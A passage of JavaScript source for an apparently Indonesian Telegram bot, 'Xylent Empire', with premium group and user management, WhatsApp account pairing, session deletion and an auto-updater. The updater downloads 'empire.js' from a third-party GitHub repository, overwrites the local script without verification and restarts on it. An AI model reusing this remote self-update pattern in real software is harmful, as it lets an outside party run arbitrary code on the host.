let premiumGroups = loadJSON(premiumGroupFile) || [];

// Helper cek apakah group premium
function isGroupPremium(chatId) {
  return premiumGroups.includes(chatId.toString());
}

// Daftarkan group jadi premium
bot.command('addpremgroup', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id.toString();

  if (isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group ini sudah
│             terdaftar premium!
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups.push(chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 〕───╮
│ ◈ STATUS  : ✅ Berhasil
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ✨ Premium Aktif
│
│  Semua member di group ini
│  sekarang bisa akses fitur
│  premium!
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

// Hapus group dari premium
bot.command('delpremgroup', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id.toString();

  if (!isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ❌ Gagal
│ ◈ REASON  : Group ini bukan
│             group premium!
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups = premiumGroups.filter(id => id !== chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 〕───╮
│ ◈ STATUS  : 🚫 Dihapus
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ❌ Dicabut
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

// Tambah group lain jadi premium via ID (dari private)
bot.command('addpremgroupid', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);

  if (!args[0]) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Format salah!
│
│  Contoh penggunaan:
│  /addpremgroupid -100xxx
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  const chatId = args[0].toString();

  if (isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group sudah premium!
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups.push(chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 〕───╮
│ ◈ STATUS  : ✅ Berhasil
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ✨ Premium Aktif
│
│  Group berhasil didaftarkan
│  sebagai premium!
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});
// Hapus group lain dari premium via ID
bot.command('delpremgroupid', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);

  if (!args[0]) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Format salah!
│
│  Contoh penggunaan:
│  /delpremgroupid -100xxx
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  const chatId = args[0].toString();

  if (!isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group bukan
│             group premium!
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups = premiumGroups.filter(id => id !== chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 〕───╮
│ ◈ STATUS  : 🚫 Dihapus
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ❌ Dicabut
│
│  Group berhasil dihapus
│  dari daftar premium!
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

////=========LIST PREM GROUP========\\\\
bot.command('listpremgroup', checkOwner, async (ctx) => {
  if (premiumGroups.length === 0) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐋𝐈𝐒𝐓 〕───╮
│ ◈ STATUS  : ⚠️ Kosong
│ ◈ REASON  : Belum ada group
│             yang terdaftar
│             premium!
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  const list = premiumGroups.map((id, i) => `│ ${i + 1}. ${id}`).join('\n');

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐋𝐈𝐒𝐓 𝐆𝐑𝐎𝐔𝐏 〕───╮
│ ◈ TOTAL : ${premiumGroups.length} Group
├──────────────────────
${list}
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

////=========CEK PREM GROUP========\\\\
bot.command('cekpremgroup', async (ctx) => {
  const chatId = ctx.chat.id.toString();
  const status = isGroupPremium(chatId);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐓𝐀𝐓𝐔𝐒 〕───╮
│ ◈ GROUP   : ${ctx.chat.title || '-'}
│ ◈ ID      : ${chatId}
│ ◈ PREMIUM : ${status ? '✅ Aktif' : '❌ Tidak Aktif'}
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});
// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "XYLENTTl");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "dєvєlσpєrs", url: "https://t.me/xyzenofficial" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////=========COOLDOWN SYSTEM========\\\\

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != OWNER_ID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "🟢 Connect"
      : "🔴 No Connect";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

// ─── IMPORT CONFIG ────────────────────────────────────────────────────────
const globalConfig = require("./config.js"); 
const OWNER = globalConfig.OWNER_IDS; // Berbentuk Array: ["8768626313"]

const CONFIG = {
  RAW_URL      : "https://raw.githubusercontent.com/sanzzz134/dbbsc/main/empire.js",
  COMMITS_API  : "https://api.github.com/repos/sanzzz134/dbbsc/commits?path=empire.js&per_page=5",
  LOCAL_FILE   : path.join(__dirname, "empire.js"),
  INTERVAL_MIN : 5,
};

let autoUpdateEnabled = false;
let checkIntervalID   = null;
let lastKnownSHA      = null;

// ─── HELPERS ───────────────────────────────────────────────────────────────
function ownerOnly(ctx, next) {
  const senderId = ctx.from?.id?.toString();

  // Cek apakah ID pengirim ada di dalam array OWNER
  const isOwner = Array.isArray(OWNER_IDS) 
    ? OWNER_IDS.map(id => id.toString()).includes(senderId)
    : OWNER_IDS.toString() === senderId;

  if (!isOwner) {
    ctx.reply(
      `<blockquote>⛔ Perintah ini hanya untuk <b>owner</b>.</blockquote>`,
      { parse_mode: "HTML" }
    );
    return; // Stop eksekusi di sini
  }
  return next(); // Lanjut ke command jika benar owner
}

function httpGet(url) {
  return new Promise((resolve, reject) => {
    https.get(url, { headers: { "User-Agent": "XylentEmpireBot" } }, (res) => {
      let body = "";
      res.on("data", (chunk) => (body += chunk));
      res.on("end", () => resolve({ status: res.statusCode, body }));
    }).on("error", reject);
  });
}

async function getLatestSHA() {
  const { body } = await httpGet(CONFIG.COMMITS_API);
  const commits  = JSON.parse(body);
  if (!Array.isArray(commits) || !commits[0]) throw new Error("Commit list kosong");
  return commits[0].sha;
}

async function downloadFile() {
  const response = await axios.get(CONFIG.RAW_URL, { timeout: 10000 });
  const newData  = response.data;

  if (!newData || typeof newData !== "string") {
    throw new Error("File dari server kosong atau tidak valid.");
  }

  if (fs.existsSync(CONFIG.LOCAL_FILE)) {
    fs.copyFileSync(CONFIG.LOCAL_FILE, CONFIG.LOCAL_FILE + ".bak");
  }

  fs.writeFileSync(CONFIG.LOCAL_FILE, newData, "utf-8");
  console.log(`[AutoUpdate] File berhasil ditulis ke: ${CONFIG.LOCAL_FILE}`);
}

async function checkUpdate(chatId = null) {
  try {
    const sha     = await getLatestSHA();
    const isFirst = lastKnownSHA === null;

    if (sha === lastKnownSHA) {
      if (chatId) {
        bot.telegram.sendMessage(chatId,
          `<blockquote>✅ <b>Tidak ada update baru.</b>\n\n` +
          `Sistem sudah menggunakan versi terbaru.\n\n` +
          `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System</i></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
      return;
    }

    if (isFirst) {
      lastKnownSHA = sha;
      console.log(`[AutoUpdate] Terhubung. Sistem siap memantau pembaruan terbaru.`);
      if (chatId) {
        bot.telegram.sendMessage(chatId,
          `<blockquote>✅ <b>Sistem Siap!</b>\n\n` +
          `Siap memantau pembaruan terbaru dari owner.\n\n` +
          `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System</i></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
      return;
    }

    // JIKA ADA UPDATE BARU
    lastKnownSHA = sha;
    await downloadFile();

    // Tentukan target chat aman (Gunakan ID pengirim, atau index pertama dari array owner jika otomatis)
    const targetChat = chatId || (Array.isArray(OWNER_IDS) ? OWNER_IDS[0] : OWNER_IDS);

    await bot.telegram.sendMessage(targetChat,
      `<blockquote>🚀 <b>Auto-Update Berhasil!</b>\n\n` +
      `Sistem akan dimuat ulang otomatis dalam 3 detik untuk menerapkan perubahan.</blockquote>`,
      { parse_mode: "HTML" }
    );

    setTimeout(() => { process.exit(); }, 3000);

  } catch (err) {
    console.error("[AutoUpdate] Error:", err.message);
    const errMsg =
      `<blockquote>❌ <b>Gagal cek update:</b>\n` +
      `<code>${err.message}</code></blockquote>`;
    
    if (bot && bot.telegram) {
      const fallbackChat = Array.isArray(OWNER_IDS) ? OWNER_IDS[0] : OWNER_IDS;
      bot.telegram.sendMessage(fallbackChat, errMsg, { parse_mode: "HTML" }).catch(() => {});
    }
  }
}

async function startAutoUpdate(chatId) {
  if (autoUpdateEnabled) {
    return bot.telegram.sendMessage(chatId,
      `<blockquote>⚠️ <b>Auto-Update sudah berjalan!</b>\n\n` +
      `Sistem pemantau pembaruan sudah aktif\n` +
      `dan sedang berjalan di latar belakang.\n\n` +
      `Gunakan /updatestatus untuk melihat status.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  autoUpdateEnabled = true;
  
  const ms        = CONFIG.INTERVAL_MIN * 60 * 1000;
  checkIntervalID = setInterval(() => checkUpdate(null), ms);

  await checkUpdate(chatId);

  bot.telegram.sendMessage(chatId,
    `<blockquote>✅ <b>Auto-Update Diaktifkan!</b>\n\n` +
    `Sistem pemantau pembaruan kini telah berjalan\n` +
    `dan siap mendeteksi perubahan terbaru secara otomatis.\n\n` +
    `┌─────────────────────────\n` +
    `│ 📦 File     : <code>empire.js</code>\n` +
    `│ ⏱ Interval : setiap <b>${CONFIG.INTERVAL_MIN} menit</b>\n` +
    `│ ⏰ Aktif    : ${new Date().toLocaleString("id-ID")}\n` +
    `└─────────────────────────\n\n` +
    `🔍 Bot akan otomatis mengecek apakah owner\n` +
    `telah mengupload file baru di GitHub.\n` +
    `Jika ada pembaruan, sistem akan langsung\n` +
    `mengunduh dan menerapkannya secara otomatis.\n\n` +
    `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System — Aktif</i></blockquote>`,
    { parse_mode: "HTML" }
  );
}

function stopAutoUpdate(chatId) {
  if (!autoUpdateEnabled) {
    return bot.telegram.sendMessage(chatId,
      `<blockquote>⚠️ <b>Auto-Update sudah mati.</b>\n\n` +
      `Gunakan /autoupdate on untuk mengaktifkan kembali.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  clearInterval(checkIntervalID);
  checkIntervalID   = null;
  autoUpdateEnabled = false;

  bot.telegram.sendMessage(chatId,
    `<blockquote>🔴 <b>Auto-Update Dimatikan!</b>\n\n` +
    `Sistem pemantau pembaruan telah dihentikan\n` +
    `dan tidak akan mengecek perubahan apapun\n` +
    `sampai diaktifkan kembali.\n\n` +
    `┌─────────────────────────\n` +
    `│ 📦 File  : <code>empire.js</code>\n` +
    `│ ⏰ Mati  : ${new Date().toLocaleString("id-ID")}\n` +
    `└─────────────────────────\n\n` +
    `⚠️ Selama auto-update mati, sistem tidak\n` +
    `akan mendeteksi pembaruan terbaru dari owner.\n` +
    `Gunakan /checkupdate untuk cek manual,\n` +
    `atau /autoupdate on untuk mengaktifkan kembali.\n\n` +
    `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System — Nonaktif</i></blockquote>`,
    { parse_mode: "HTML" }
  );
}

// ─── COMMANDS ──────────────────────────────────────────────────────────────

bot.command("updatesc", ownerOnly, async (ctx) => {
  const chatId  = ctx.chat.id;
  const statusMsg = await ctx.reply("🔍 *Mengecek pembaruan sistem...*", { parse_mode: "Markdown" });

  try {
    const response    = await axios.get(CONFIG.RAW_URL, { timeout: 10000 });
    const newData     = response.data;

    if (!newData || typeof newData !== "string") {
      throw new Error("File dari server kosong atau tidak valid.");
    }

    const currentData = fs.readFileSync(CONFIG.LOCAL_FILE, "utf8");
    if (newData === currentData) {
      return ctx.telegram.editMessageText(
        chatId,
        statusMsg.message_id,
        undefined,
        "Sistem sudah dalam versi terbaru. ✅"
      );
    }

    if (fs.existsSync(CONFIG.LOCAL_FILE)) {
      fs.copyFileSync(CONFIG.LOCAL_FILE, CONFIG.LOCAL_FILE + ".bak");
    }
    fs.writeFileSync(CONFIG.LOCAL_FILE, newData, "utf-8");

    await ctx.telegram.editMessageText(
      chatId,
      statusMsg.message_id,
      undefined,
      "🚀 *Update Berhasil!*\n\nSistem akan melakukan restart otomatis dalam 3 detik untuk menerapkan perubahan.",
      { parse_mode: "Markdown" }
    );

    setTimeout(() => { process.exit(); }, 3000);

  } catch (e) {
    console.error("Update Error:", e.message);
    if (fs.existsSync(CONFIG.LOCAL_FILE + ".bak")) {
      fs.copyFileSync(CONFIG.LOCAL_FILE + ".bak", CONFIG.LOCAL_FILE);
    }
    ctx.reply(`❌ *Update Gagal!*\nTerjadi kesalahan: \`${e.message}\``, { parse_mode: "Markdown" });
  }
});

bot.command("autoupdate", ownerOnly, async (ctx) => {
  const args   = ctx.message.text.split(" ");
  const action = (args[1] || "").toLowerCase();

  if (action === "on")       await startAutoUpdate(ctx.chat.id);
  else if (action === "off") stopAutoUpdate(ctx.chat.id);
  else ctx.reply("Gunakan: /autoupdate on atau /autoupdate off");
});

bot.command("checkupdate", ownerOnly, async (ctx) => {
  await ctx.reply(
    `<blockquote>🔍 <b>Memeriksa Pembaruan...</b>\n\n` +
    `Sistem sedang menghubungi GitHub Repository.\n` +
    `Mohon tunggu sebentar...</blockquote>`,
    { parse_mode: "HTML" }
  );
  await checkUpdate(ctx.chat.id);
});

bot.command("updatestatus", ownerOnly, (ctx) => {
  ctx.reply(
    `<blockquote>📊 <b>Status Auto-Update</b>\n\n` +
    `┌─────────────────────────\n` +
    `│ 🔌 Status   : ${autoUpdateEnabled ? "🟢 AKTIF" : "🔴 MATI"}\n` +
    `│ ⏱ Interval : ${CONFIG.INTERVAL_MIN} menit\n` +
    `│ 📦 File     : <code>empire.js</code>\n` +
    `└─────────────────────────\n\n` +
    `<i>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 Auto-Update System</i></blockquote>`,
    { parse_mode: "HTML" }
  );
});

/////////////////START FUNC/////////////////////////
///////////////////[END FUNC]////////////////
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();